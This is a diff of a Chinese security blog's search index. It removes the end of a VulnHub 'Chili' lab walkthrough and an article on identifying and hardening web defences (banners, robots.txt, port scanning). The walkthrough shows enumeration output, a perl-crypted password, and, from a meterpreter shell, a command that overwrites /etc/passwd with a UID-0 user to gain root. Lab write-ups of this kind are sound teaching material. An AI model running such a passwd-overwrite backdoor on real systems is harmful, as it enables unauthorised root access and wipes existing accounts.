-<h2 id="User-Accounts"><a href="#User-Accounts" class="headerlink" title="User Accounts"></a>User Accounts</h2><p>root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash<br>sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync<br>chili:x:1000:1000:chili,,,:&#x2F;home&#x2F;chili:&#x2F;bin&#x2F;bash</p>
-<h2 id="Who-Else-Is-Logged-On"><a href="#Who-Else-Is-Logged-On" class="headerlink" title="Who Else Is Logged On"></a>Who Else Is Logged On</h2><p> 10:22:42 up  1:42,  0 users,  load average: 0.00, 0.00, 0.00<br>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</p>
-<h2 id="Groups"><a href="#Groups" class="headerlink" title="Groups"></a>Groups</h2><p>uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)<br>uid&#x3D;1(daemon) gid&#x3D;1(daemon) groups&#x3D;1(daemon)<br>uid&#x3D;2(bin) gid&#x3D;2(bin) groups&#x3D;2(bin)<br>uid&#x3D;3(sys) gid&#x3D;3(sys) groups&#x3D;3(sys)<br>uid&#x3D;4(sync) gid&#x3D;65534(nogroup) groups&#x3D;65534(nogroup)<br>uid&#x3D;5(games) gid&#x3D;60(games) groups&#x3D;60(games)<br>uid&#x3D;6(man) gid&#x3D;12(man) groups&#x3D;12(man)<br>uid&#x3D;7(lp) gid&#x3D;7(lp) groups&#x3D;7(lp)<br>uid&#x3D;8(mail) gid&#x3D;8(mail) groups&#x3D;8(mail)<br>uid&#x3D;9(news) gid&#x3D;9(news) groups&#x3D;9(news)<br>uid&#x3D;10(uucp) gid&#x3D;10(uucp) groups&#x3D;10(uucp)<br>uid&#x3D;13(proxy) gid&#x3D;13(proxy) groups&#x3D;13(proxy)<br>uid&#x3D;33(www-data) gid&#x3D;33(www-data) groups&#x3D;33(www-data)<br>uid&#x3D;34(backup) gid&#x3D;34(backup) groups&#x3D;34(backup)<br>uid&#x3D;38(list) gid&#x3D;38(list) groups&#x3D;38(list)<br>uid&#x3D;39(irc) gid&#x3D;39(irc) groups&#x3D;39(irc)<br>uid&#x3D;41(gnats) gid&#x3D;41(gnats) groups&#x3D;41(gnats)<br>uid&#x3D;65534(nobody) gid&#x3D;65534(nogroup) groups&#x3D;65534(nogroup)<br>uid&#x3D;100(_apt) gid&#x3D;65534(nogroup) groups&#x3D;65534(nogroup)<br>uid&#x3D;101(systemd-timesync) gid&#x3D;102(systemd-timesync) groups&#x3D;102(systemd-timesync)<br>uid&#x3D;102(systemd-network) gid&#x3D;103(systemd-network) groups&#x3D;103(systemd-network)<br>uid&#x3D;103(systemd-resolve) gid&#x3D;104(systemd-resolve) groups&#x3D;104(systemd-resolve)<br>uid&#x3D;1000(chili) gid&#x3D;1000(chili) groups&#x3D;1000(chili),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)<br>uid&#x3D;999(systemd-coredump) gid&#x3D;999(systemd-coredump) groups&#x3D;999(systemd-coredump)<br>uid&#x3D;104(messagebus) gid&#x3D;110(messagebus) groups&#x3D;110(messagebus)<br>uid&#x3D;105(sshd) gid&#x3D;65534(nogroup) groups&#x3D;65534(nogroup)<br>uid&#x3D;106(ftp) gid&#x3D;113(ftp) groups&#x3D;113(ftp)</p>
-<p>Severity: MEDIUM  Name: sysctl ptrace is configured insecurly                                           -rw-r–r– 1 root root 0 Jun 20 10:22 &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;yama&#x2F;ptrace_scope<br><strong>Severity: INFO    Name: Found an new root user with UID 0: root</strong>                                         <strong>-rw-r–rw- 1</strong> root root 1450 Sep  8  2020 &#x2F;etc&#x2F;passwd<br>Severity: INFO    Name: Found an new root user with GID 0: root                                         -rw-r–rw- 1 root root 1450 Sep  8  2020 &#x2F;etc&#x2F;passwd<br>Severity: INFO    Name: Found an new user that can be logged into: root                                 -rw-r–rw- 1 root root 1450 Sep  8  2020 &#x2F;etc&#x2F;passwd<br>Severity: INFO    Name: Found an new user that can be logged into: sync                                 -rw-r–rw- 1 root root 1450 Sep  8  2020 &#x2F;etc&#x2F;passwd<br>Severity: HIGH    Name: Found a home directory that does not exist, but is attached to an existing user<br>Severity: HIGH    Name: Found a home directory that does not exist, but is attached to an existing user<br>Severity: HIGH    Name: Found a home directory that does not exist, but is attached to an existing user<br>Severity: HIGH    Name: Found a home directory that does not exist, but is attached to an existing user<br>Severity: HIGH    Name: Found a home directory that does not exist, but is attached to an existing user<br>Severity: HIGH    Name: Found a home directory that does not exist, but is attached to an existing user<br>Severity: HIGH    Name: Found a home directory that does not exist, but is attached to an existing user<br>Severity: HIGH    Name: Found a home directory that does not exist, but is attached to an existing user<br>Severity: HIGH    Name: Found a home directory that does not exist, but is attached to an existing user<br>Severity: INFO    Name: Found an new user that can be logged into: chili                                -rw-r–rw- 1 root root 1450 Sep  8  2020 &#x2F;etc&#x2F;passwd<br>Severity: HIGH    Name: Found a home directory that does not exist, but is attached to an existing user<br>Severity: HIGH    Name: Found a home directory that does not exist, but is attached to an existing user<br>Severity: HIGH    Name: Low entropy file that could be a private key                                    -rw-r–r– 1 root root 20661 Feb 11  2019 &#x2F;usr&#x2F;share&#x2F;X11&#x2F;xkb&#x2F;symbols&#x2F;pk<br>Severity: INFO    Name: Config file could contain passwords                                             -rw-r–r– 1 root root 494 Feb 10  2019 &#x2F;usr&#x2F;share&#x2F;libc-bin&#x2F;nsswitch.conf<br>Severity: MEDIUM  Name: Executable capable of spawning reverse shells found                             -rwxr-xr-x 1 root root 1168776 Apr 18  2019 &#x2F;usr&#x2F;bin&#x2F;bash<br>Severity: MEDIUM  Name: Executable capable of spawning reverse shells found                             -rwxr-xr-x 1 root root 736776 Apr 20  2020 &#x2F;usr&#x2F;bin&#x2F;openssl<br>Severity: MEDIUM  Name: Executable capable of spawning reverse shells found                             -rwxr-xr-x 2 root root 3201864 Jul 21  2020 &#x2F;usr&#x2F;bin&#x2F;perl<br>Severity: HIGH    Name: CAP_NET_RAW capablities enabled on file                                         -rwxr-xr-x 1 root root 69368 Jan 13  2020 &#x2F;usr&#x2F;bin&#x2F;ping<br>Severity: MEDIUM  Name: Executable capable of spawning reverse shells found                             -rwxr-xr-x 1 root root 8156 Jul 21  2020 &#x2F;usr&#x2F;bin&#x2F;cpan<br>Severity: MEDIUM  Name: Abnormal GUID enabled executable found                                          -rwxr-sr-x 1 root crontab 43568 Oct 11  2019 &#x2F;usr&#x2F;bin&#x2F;crontab<br>Severity: MEDIUM  Name: Abnormal GUID enabled executable found                                          -rwxr-sr-x 1 root tty 14736 May  4  2018 &#x2F;usr&#x2F;bin&#x2F;bsd-write<br>Severity: MEDIUM  Name: Abnormal SUID enabled executable found                                          -rwsr-xr-x 1 root root 10232 Mar 28  2017 &#x2F;usr&#x2F;lib&#x2F;eject&#x2F;dmcrypt-get-device<br>Severity: INFO    Name: Config file could contain passwords                                             -rw-r–r– 1 root root 239 Sep 27  2017 &#x2F;usr&#x2F;lib&#x2F;tmpfiles.d&#x2F;passwd.conf<br>Severity: MEDIUM  Name: Found backup &#x2F;etc&#x2F;shadow file                                                   -rw-r—– 1 root shadow 965 Sep  8  2020 &#x2F;etc&#x2F;shadow-<br>Severity: INFO    Name: Found backup &#x2F;etc&#x2F;passwd file                                                   -rw-r–r– 1 root root 1437 Sep  8  2020 &#x2F;etc&#x2F;passwd-<br>Severity: INFO    Name: Config file could contain passwords                                             -rw-r–r– 1 root root 494 Feb 10  2019 &#x2F;etc&#x2F;nsswitch.conf<br>Severity: INFO    Name: Config file could contain passwords                                             -rw-r–r– 1 root root 5849 Sep  8  2020 &#x2F;etc&#x2F;vsftpd.conf<br>Severity: MEDIUM  Name: Other permissions are higher than Group permissions                             -rw-r–rw- 1 root root 1450 Sep  8  2020 &#x2F;etc&#x2F;passwd<br>Generating JSON<br>Json saved at location -&gt; enumy.json<br>Total files scanned -&gt; 25176</p>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230620222925066.png"></p>
-<p>发现，对&#x2F;etc&#x2F;passwd有写的权限</p>
-<h4 id="添加一个高权限用户"><a href="#添加一个高权限用户" class="headerlink" title="添加一个高权限用户"></a>添加一个高权限用户</h4><p>使用perl编译密码</p>
-<blockquote>
-<p>┌──(root㉿kali)-[~]<br>└─# &#x2F;usr&#x2F;bin&#x2F;perl -le ‘print crypt(“test”,”test”)’<br>teH0wLIpW0gyQ</p>
-</blockquote>
-<p><strong>在监听端口的shell中</strong></p>
-<blockquote>
-<p>Terminate channel 0? [y&#x2F;N]  y<br>meterpreter &gt; shell<br>Process 1249 created.<br>Channel 1 created.<br><strong>echo “test:teH0wLIpW0gyQ:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash” &gt; &#x2F;etc&#x2F;passwd</strong><br>&#x2F;&#x2F;test:teH0wLIpW0gyQ:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash这种格式是遵循 <code>/etc/passwd</code> 文件的格式。每个字段用冒号（<code>:</code>）分隔，表示不同的用户属性。按顺序，这些字段包括用户名、密码（在此示例中使用了一个哈希值）、用户ID、组ID、用户描述、主目录和默认的登录Shell。</p>
-</blockquote>
-<blockquote>
-<p>Terminate channel 1? [y&#x2F;N]  y<br>meterpreter &gt; shell<br>Process 1251 created.<br>Channel 2 created.<br>su test<br>Password: test<br>ls &#x2F;root<br>proof.txt<br>cat &#x2F;root&#x2F;proof.txt<br>Sun_CSR.Chili.af6d45da1f1181347b9e2139f23c6a5b</p>
-</blockquote>
-<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>主机发现-&gt;端口扫描-&gt;版本、系统信息</p>
-<p>网页f12的敏感数据，ftp的密码爆破</p>
-<p>msfvenom，是一个可以生成后门木马的框架，在目标机上执行，本地监听上线。</p>
-<p>enumy64是一个linux后渗透提权枚举工具，一个快速的可移植可执行文件</p>
-<p>写入&#x2F;etc&#x2F;passwd中的密码时需要将写入的密码首先进行perl编码</p>
-<p>[VulnHub靶场系列：Chili_chili靶场_快吃小蛋糕吧的博客-CSDN博客](<a href="https://blog.csdn.net/qq_40549070/article/details/108926099?ops_request_misc=%7B%22request_id%22:%22168726603016800213067085%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=168726603016800213067085&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~hot_rank-1-108926099-null-null.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=vulnhub">https://blog.csdn.net/qq_40549070/article/details/108926099?ops_request_misc=%7B%22request%5Fid%22%3A%22168726603016800213067085%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fall.%22%7D&amp;request_id=168726603016800213067085&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~hot_rank-1-108926099-null-null.142^v88^control_2,239^v2^insert_chatgpt&amp;utm_term=vulnhub</a> chili&amp;spm&#x3D;1018.2226.3001.4187)</p>
-<h2 id="2、tiki"><a href="#2、tiki" class="headerlink" title="2、tiki"></a>2、tiki</h2>]]></content>
-      <categories>
-        <category>渗透测试</category>
-        <category>vulnhub</category>
-        <category>靶场</category>
-      </categories>
-      <tags>
-        <tag>渗透测试</tag>
-        <tag>vulnhub</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>ctfshow</title>
     <url>/2023/06/28/ctfshow/</url>
     <content><![CDATA[<h1 id="1-登录框"><a href="#1-登录框" class="headerlink" title="1.登录框"></a>1.登录框</h1><h2 id="1-web6"><a href="#1-web6" class="headerlink" title="1.web6"></a>1.web6</h2><p><code>常见的&#39; or 1=1#</code>会被检测到</p>
@@ -14092,193 +14072,6 @@
       </tags>
   </entry>
   <entry>
-    <title>web防护及识别</title>
-    <url>/2023/06/11/%E7%94%A8%E6%88%B7%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84%E9%98%B2%E6%8A%A4%E6%89%8B%E6%AE%B5%E8%AF%86%E5%88%AB/</url>
-    <content><![CDATA[<p>标准的防护方案为从硬件层面利用防火墙封锁高危IP、利用WAF设备在线阻断攻击，或者在Web服务器上开启防火墙、部署相关防护策略等。</p>
-<p>大部分防护手段对攻击的防护效果良好，如各类硬件WAF、各类云WAF、服务器防护软件等。</p>
-<p>在用户视角下进行防护手段的识别，可更有效地发现当前系统的隐藏威胁。</p>
-<h1 id="1-开放端口及对应业务识别"><a href="#1-开放端口及对应业务识别" class="headerlink" title="1.开放端口及对应业务识别"></a>1.开放端口及对应业务识别</h1><p>kali利用nmap对特定ip扫描端口，可以找到一些<strong>open状态的</strong>端口。</p>
-<p>遇到一些是<strong>filtered状态</strong>的端口呢，说明是开放的，但成为阻断状态，说明目标主机不仅限于有防火墙，各类防护软件、配置规则等都能形成filtered的效果。</p>
-<blockquote>
-<p>扫描开放端口的目的在于寻找可与目标服务器交互的点，并且了解目标的具体功能。在进行内网渗透时，这些被防火墙过滤的端口在内网中便可被使用。因此，扫描端口的作用非常多，并可有效扩展攻击目标。</p>
-</blockquote>
-<h1 id="2-是否有防护类软件"><a href="#2-是否有防护类软件" class="headerlink" title="2.是否有防护类软件"></a>2.是否有防护类软件</h1><p>1）直接<strong>利用错误参数打开目标站点的报错页面</strong>。例如，安全狗、360云防护等会在报错页面留有明确信息或特征。这些特征基本上无法修改，并且部分防护软件还会在报错页面中添加广告信息等，这都算是防护软件的一种标识。</p>
-<p>2）<strong>利用NMAP扫描目标站点，查看是否有已开放但被过滤的端口</strong>。如存在这样的端口，基本上可判定服务器前面会有防火墙。如果端口被防火墙过滤，那么此端口在外部无法直接利用。但事无绝对，假设内网数据库服务器开放3306端口并在防火墙处被过滤，则攻击者如果对此网络中任意一台设备成功渗透，就可以在内网利用3306端口开展连接等。</p>
-<p>3）<strong>利用Burpsuite抓取与目标系统通信的响应包，观察HTTP包头的server参数，看是否有WAF相关标识。</strong></p>
-<p>4）<strong>利用目录爆破工具，并从低速逐步升到高速，查看哪些阶段被封锁</strong>。一个没有添加防护设备或防护策略的站点并不会阻拦来自互联网的访问行为。设置安全设备或安全策略时都会考虑针对DDoS攻击的防护，会对来自同一地址的访问频率进行限制。因此<strong>逐步提升访问效率，即可测试出目标站点的阈值</strong>。可利用工具进行测试，</p>
-<h2 id="防护总结"><a href="#防护总结" class="headerlink" title="防护总结"></a>防护总结</h2><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230618200336378.png"></p>
-<blockquote>
-<p>搜索结果的 “banner” 是指在网络设备（如服务器、路由器、摄像头等）的响应中返回的特定信息。这些信息通常包含了设备的详细描述、设备型号、软件版本、协议信息等。通过分析设备返回的 banner 信息</p>
-</blockquote>
-<h1 id="3-常用防护方案"><a href="#3-常用防护方案" class="headerlink" title="3.常用防护方案"></a>3.常用防护方案</h1><p>在设计整体防护方案时，大多数人的直观想法是尽可能消灭漏洞。</p>
-<p>但在实际安全防护工作中，由于Web开发人员对安全的理解不足、运维人员的安全技术能力稍弱等因素，均会造成无法在第一时间发现漏洞并将其消除。</p>
-<p>漏洞会随着攻防技术发展不断涌现，而且公司的渗透测试和代码审计服务价格不菲。因此，在设计方案时，必须考虑“适度防护”。</p>
-<p>适度防护的原则是：<strong>建立防护手段，使攻击者的攻击代价（时间成本等）大于攻击成功后的价值</strong>，这样可使攻击者主动放弃攻击目标，从而达到较好的防护效果。</p>
-<h2 id="1-整体防护思路"><a href="#1-整体防护思路" class="headerlink" title="1.整体防护思路"></a>1.整体防护思路</h2><p>考虑整体方式思路时，最优的手段并不是增加大量防护工具或软件，而是先识别攻击者能连接过来的路径及攻击者可看到的信息。</p>
-<p>从攻击者的角度考虑，如果要针对一个系统开展攻击，必须先识别攻击目标的基本特征。对于Web网站来说，其基本特征包含以下几项：</p>
-<blockquote>
-<p>·目标的端口号（确认攻击目标有哪些）。</p>
-<p>·目标中间件及服务的版本（针对版本寻找可用漏洞）。</p>
-<p>·目标是否有明显漏洞等信息。</p>
-</blockquote>
-<p>可见，在防护阶段应尽可能减少有效信息的暴露，这样会极大增加攻击者的攻击难度，明显提升网站的防护效果。</p>
-<h2 id="2-简单防护方案"><a href="#2-简单防护方案" class="headerlink" title="2.简单防护方案"></a>2.简单防护方案</h2><p>中小Web站点的管理人员技术实力有限，无法做到从Web网站代码层面发现漏洞并进行防护。因此，作为中小站点的管理人员，应首先考虑降低当前站点对外提供服务时可被获取有效信息的可能性，并且及时地停用高危服务或端口。再利用漏扫工具扫一遍，查漏补缺。</p>
-<h3 id="1-关闭或修改服务器开放端口"><a href="#1-关闭或修改服务器开放端口" class="headerlink" title="1.关闭或修改服务器开放端口"></a>1.关闭或修改服务器开放端口</h3><p>Web服务器会利用HTTP（TCP80）、HTTPS（TCP443）协议为用户提供Web访问服务。</p>
-<p>除了有特殊端口提供服务，非必要开放端口尽量关闭，如FTP（21）、SSH（22）等。</p>
-<p>如果涉及特殊业务系统必须要<strong>开启特殊端口，建议采用防火墙、iptables等限制非业务端口的连接IP地址</strong>，即利用<strong>白名单技术实现访问控制</strong>，从而尽可能减少外部链接通道。</p>
-<p>针对特殊Web应用环境，如单一IP要实现多个Web应用共存，由于每个Web应用均需要一个独立的TCP端口，因此在这个过程中会涉及非默认端口的情况。针对这种情况，建议将端口设置成为<strong>非常见的端口</strong>。这样，NMAP在利用默认参数进行扫描时就不会发现修改过的端口，也就能避免特定应用被攻击者发现。需要注意的是，如果修改了http&#x2F;https的默认端口，那么后续在访问站点时需要在域名后面添加端口号，如<a href="http://www.xxx.com:30303。访问时添加端口号会给一般用户带来一定的困扰，**因此推荐在各类在线维护系统或内部系统使用**，并且这类系统通常较为敏感及重要，更建议隐藏端口。">http://www.xxx.com:30303。访问时添加端口号会给一般用户带来一定的困扰，**因此推荐在各类在线维护系统或内部系统使用**，并且这类系统通常较为敏感及重要，更建议隐藏端口。</a></p>
-<p>以常见的端口扫描工具NMAP为例，执行如下命令：</p>
-<p><code>#nmap -sS 192.168.1.1</code></p>
-<p>实现的效果是利用SYN对目标进行半开链接扫描。在执行上述命令时，NMAP默认扫描端口是：1～1024端口及NMAP中nmap-services（nmap主目录里面）文件里的端口列表。</p>
-<p>如果配置文件不设置的话，就是默认配置。</p>
-<p>当然了，如果没发现目标端口</p>
-<p><code>nmap -p0-65535 192.168.211.129</code> 扩大端口量即可</p>
-<p><strong>全端口扫描</strong>的时间大约是标准扫描时间的20倍左右。在实际场景中，攻击者会大范围开展扫描。<strong>考虑到扫描速度，基本会采用NMAP的默认端口开展扫描</strong>（全端口扫描会显著降低扫描速度）。</p>
-<blockquote>
-<p><strong>因此，推荐将非HTTP&#x2F;HTTPS默认端口的Web网站（如各类管理后台页面、管理地址等）修改为非NMAP默认端口号，可有效降低被发现的概率。</strong></p>
-</blockquote>
-<h3 id="2-利用防护类工具"><a href="#2-利用防护类工具" class="headerlink" title="2.利用防护类工具"></a>2.利用防护类工具</h3><p>目前，常用的防护类工具分为软件、硬件两种。其中，<strong>硬件</strong>防护工具价格<strong>较贵</strong>，<strong>软件</strong>防护工具<strong>有免费版</strong>可供选择。由于Web站点的独立性，每个站点均有其独特的应用场景及业务流程，这就要求安全工具在配置完毕后需按照Web站点进行相应的规则配置。安全产品及工具如果配置得当，会产生良好的防护效果，<strong>如果仅采用默认配置，则通常只有事倍功半的结果。</strong></p>
-<blockquote>
-<p>针对中小用户，在没有独立机房的情况下可考虑利用各类<strong>在线云WAF</strong>进行防护，或者<strong>部署相关软件</strong>（如安全狗均可），这类工具安装简便且防护效果良好，<strong>再配合各类webshell查杀工具</strong>定期对Web目录进行检查，即可有效提升站点的安全性。</p>
-</blockquote>
-<p>如果Web站点部署在各类云平台上，那么可利用云平台提供的防护类工具开展针对性的安全检查。这类工具的费用及效果均可满足中小企业的需求。例如，阿里云上提供应用安全工具，可按照需求购买，成本非常低。</p>
-<p>但需注意的是，<strong>安全产品内置的防护规则在默认状态下并不完全适合各类型Web站点。</strong>这主要是由于站点的架构及功能特点各不相同而导致的。例如，对于一个技术论坛，其中会针对各类代码进行讨论，这是此站点的正常业务行为，但由于大量含有代码的讨论内容会被防护设备识别成攻击，反而带来不便。因此，在防护类工具选择上，是否购买是一个问题，但如何更好地发挥防护类工具及自定义规则设置是另一个需要考虑的因素。</p>
-<h3 id="3-采用成熟的CMS系统"><a href="#3-采用成熟的CMS系统" class="headerlink" title="3.采用成熟的CMS系统"></a>3.采用成熟的CMS系统</h3><p>成熟的CMS在整体防护策略及安全性方面更加完善。</p>
-<p>有针对各类基础漏洞的防护方法、针对用户传参的参数化查询或者转义架构等。</p>
-<p>当然了，一般格式高度统一，对用户个性化有影响。目前主流的CMS已具备良好的二次开发能力了。</p>
-<h2 id="3-提升安全性的基础手段"><a href="#3-提升安全性的基础手段" class="headerlink" title="3.提升安全性的基础手段"></a>3.提升安全性的基础手段</h2><p>从技术原理上说，仅通过防护类软件，并不一定能完全实现漏洞防护，更不能实现业务层面的逻辑漏洞的防护。因此，最佳手段是在服务器层面提升防护效果等。在了解漏洞的原理之后思考，是否可以<strong>从开始就对漏洞的痕迹进行隐藏</strong>、从开始就对漏洞进行<strong>掩饰</strong>，以<strong>提升攻击者的攻击成本</strong>。</p>
-<h3 id="1-隐藏Web服务器的banner"><a href="#1-隐藏Web服务器的banner" class="headerlink" title="1.隐藏Web服务器的banner"></a>1.隐藏Web服务器的banner</h3><p>在各类应用中，常用<strong>banner信息</strong>来表示<strong>某项中间件或操作系统的特征，其中包含类型（Apache、Tomcat、nginx等）、版本号等信息</strong>。这些信息在渗透测试中非常有价值，主要体现在在特定中间件或操作系统版本上会存在各类已知的高危漏洞。当攻击者获取其对应的版本信息之后，可根据版本信息寻找有效的攻击方式。</p>
-<p>查看banner信息的好处在于，可以根据对应的版本信息寻找其对应的版本漏洞，常见的有以下几种：</p>
-<p><strong>·Apache：存在解析漏洞，range畸形包可导致DDoS攻击。</strong></p>
-<p><strong>·PHP：5.3.4版本之前存在%00截断。</strong></p>
-<p>攻击者获得目标服务器的banner信息方式为：</p>
-<blockquote>
-<p>1.利用NMAP进行扫描</p>
-<p><code>nmap –sV –Pn &#39;target IP&#39;</code></p>
-</blockquote>
-<blockquote>
-<p>2.利用非正常页面查看banner信息</p>
-<p>中间件的默认页面在没有修改的情况下，其返回的页面中会包含对应的banner信息。以常见的404页面为例，利用错误路径触发目标站点显示404页面，就可看到其中的服务器banner。</p>
-</blockquote>
-<blockquote>
-<p>3.抓取服务器response包一样会有服务器信息</p>
-<p>见bp抓的响应包中的server。</p>
-</blockquote>
-<p>目前各类浏览器及Web应用并不需要知道服务器的banner信息，因此可考虑将其关闭或删除。</p>
-<p>几个中间件的banner修改方案如下：</p>
-<h4 id="（l）修改Apache-banner"><a href="#（l）修改Apache-banner" class="headerlink" title="（l）修改Apache banner"></a>（l）修改Apache banner</h4><blockquote>
-<p>关闭版本号显示的方法如下：</p>
-<p>1）找到&#x2F;etc&#x2F;apache2&#x2F;apache2.conf或&#x2F;etc&#x2F;apache2&#x2F;httpd.conf（根据相应的Linux发行版选择）。</p>
-<p>2）找到项目，将ServerSignature on改为ServerSignature off。</p>
-<p>3）找到项目，将ServerTokens Full改为ServerTokens prod。</p>
-</blockquote>
-<p>以上两项均需修改，如果部分Apache版本的配置文件中没有上述配置，那么直接在http.conf中添加上述两行配置即可。</p>
-<p>修改完成之后重新进行检查。先利用Burpsuite抓包，可发现在response中已不显示版本情况。</p>
-<p>如果要替换banner名称为专有，可编辑<strong>ap_release.h文件</strong>，方法如下：修改<code>&quot;#define AP_SERVER_BASEPRODUCT&quot;Apache&quot;&quot;为&quot;#define AP_SERVER_BASEPRODUCT&quot;Microsoft-IIS/7.0&quot;</code>。这是一种欺骗的方法，能有效迷惑攻击者。毕竟Apache中怎么也不会存在IIS的漏洞，如果攻击者根据修改后的banner进行大量攻击尝试，也不会产生任何安全威胁。</p>
-<h4 id="（2）PHP版本号关闭"><a href="#（2）PHP版本号关闭" class="headerlink" title="（2）PHP版本号关闭"></a>（2）PHP版本号关闭</h4><blockquote>
-<p>关闭PHP版本号的方法为打开php.ini配置文件，找到expose_php On项目，将其修改为expose_php off即可。</p>
-<p>修改完毕后可重新抓取response包，发现X-Powered-By中的PHP版本号已消失，</p>
-</blockquote>
-<h4 id="（3）修改Nginx-Banner"><a href="#（3）修改Nginx-Banner" class="headerlink" title="（3）修改Nginx Banner"></a>（3）修改Nginx Banner</h4><blockquote>
-<p>修改Nginx配置中的相关项目，方法与Apache的方式类似。修改Server_tokens的值为off。修改后的效果类似Apache。</p>
-</blockquote>
-<h4 id="（4）修改系统默认TTL"><a href="#（4）修改系统默认TTL" class="headerlink" title="（4）修改系统默认TTL"></a>（4）修改系统默认TTL</h4><p>用以下命令修改Red Hat Linux的TTL基数为128（默认为64）：</p>
-<blockquote>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;echo 128 &gt; /proc/sys/net/ipv4/ip_default_ttl</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;net.ipv4.ip_default_ttl = 128</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p>修改版本号只是提高了攻击者的攻击时间成本，有效的防护措施依然是对现有漏洞进行发现和处理。不过由于攻击时间长，可为系统管理员争取一段发现时间，因此定期观察系统日志或利用各类防护系统观察攻击行为，也可尽早发现攻击者并采取后续处理措施。</p>
-<h3 id="2-robots-txt"><a href="#2-robots-txt" class="headerlink" title="2.robots.txt"></a>2.robots.txt</h3><p>Robots协议（也称为爬虫协议、机器人协议等）的全称是“网络爬虫排除协议”（Robots Exclusion Protocol），网站通过Robots协议告诉搜索引擎哪些页面可以抓取、哪些页面不能抓取。</p>
-<blockquote>
-<p>当一个搜索引擎的爬虫访问站点时，它会首先检查该站点的根目录下是否存在robots.txt，如果该文件存在，搜索机器人就会按照该文件中的内容来确定访问的范围；<strong>如果该文件不存在</strong>，所有的搜索引擎的爬虫将能够访问网站上所有没有被口令保护的页面。因此建议，<strong>仅当网站包含不希望被搜索引擎收录的内容时，才使用robots.txt文件</strong>；如果希望搜索引擎收录网站上所有内容，则不要建立robots.txt文件。</p>
-</blockquote>
-<p>使用robots.txt的好处在于，可清晰告知搜索引擎的爬虫哪些页面不能被收录，哪些页面可以被收录，从而避免敏感文件被访问。但是，robots.txt本身可以公开访问（搜索引擎的爬虫为公开环境），攻击者只需观察robots.txt里面的内容，也可能发现有效的内容。</p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230618222437042.png" alt="robots.txt文件样例"></p>
-<p>利用disallow的方式可理解为黑名单的方式，甚至可以直接告知攻击者，哪些连接我是不想让搜索引擎收录的。</p>
-<p>为了解决这个问题，建议将传统的robots.txt替换为sitemap。目前主流搜索引擎均支持sitemap。sitemap也叫做网站XML地图，用以格式化地标注网站的整体结构。</p>
-<p>例如，百度支持三种sitemap格式：txt文本格式、xml格式、sitemap索引格式。目前常用的为xml格式。</p>
-<p>以上海移动网上营业厅（<a href="http://www.sh.10086.cn)为例,其主目录下的robots.txt/">www.sh.10086.cn）为例，其主目录下的robots.txt</a></p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230618222651935.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-agent：*</span><br><span class="line">Disallow：</span><br></pre></td></tr></table></figure>
-
-<p>表示允许一切搜索引擎的爬虫爬取网站信息。</p>
-<p>接下来，用sitemap告知搜索引擎，该站的网站地图连接在哪里，直接读取此xml文件即可获得网站的结构。</p>
-<p><strong>其优点在于利用sitemap告知了搜索引擎爬虫网站可公开的结构有哪些，其余的信息不能被爬取。</strong>这相当于实现了白名单的效果，从而很好地规避了传统写法的缺陷，值得推荐。</p>
-<h3 id="3-提升后台地址复杂度"><a href="#3-提升后台地址复杂度" class="headerlink" title="3.提升后台地址复杂度"></a>3.提升后台地址复杂度</h3><p>假设<strong>前台</strong>存在SQL注入漏洞，或者管理员用户及密码已经被攻击者掌握，那么攻击者希望找到目标站点的<strong>后台地址</strong>，以便开展后续攻击。如果后台地址无法被攻击者发现，那么攻击者空有之前成果，无法登录后台开展后续攻击。</p>
-<p>攻击者常用的寻找后台地址的方法就是利用搜索引擎，搜索admin相关的字眼，确认是否有后台等。</p>
-<p>在大部分情况下，利用搜索引擎并不能直接发现后台，这时攻击者常用的手段就是<strong>地址爆破</strong>。地址爆破的方法是拼接URL，URL由当前“域名+常用后台地址库”进行构造，再顺序访问构造后的URL是否存在，从而对目标网站的后台地址进行爆破。目录爆破类工具是利用<strong>已经定义的后台地址库进行重复尝试</strong>，并对成功返回的地址进行尝试，从而发现后台地址。</p>
-<p>作为网站所有者，<strong>基本的手段为加强后台地址复杂度</strong>，避免后台地址出现在攻击者的后台地址库中。常见的后台地址设计方案如下：</p>
-<blockquote>
-<p>1）将几组方便记忆的信息转换为MD5（可加SALT），再反序等；或者利用其他方式加强难度。方案可自行设计。这样做可显著提高攻击者爆破后台目录的时间成本。</p>
-<p>2）还有一种情况在一些早期网站中经常出现：即在前台页面中有一项进入后台管理的功能，这会直接导致当前站点的后台地址暴露。这也就是搜索引擎会将后台地址进行收录的原因。</p>
-</blockquote>
-<h2 id="4-DDoS攻击及防护方法"><a href="#4-DDoS攻击及防护方法" class="headerlink" title="4.DDoS攻击及防护方法"></a>4.DDoS攻击及防护方法</h2><p>分布式拒绝服务（Distributed Denial of Service，DDoS）攻击指利用<strong>多个节点</strong>，<strong>通过各类协议对目标发动大量链接或大流量行为</strong>，导致目标由于性能及带宽原因，无法有效处理来自攻击节点的各类访问请求，最终实现服务终止的情况。</p>
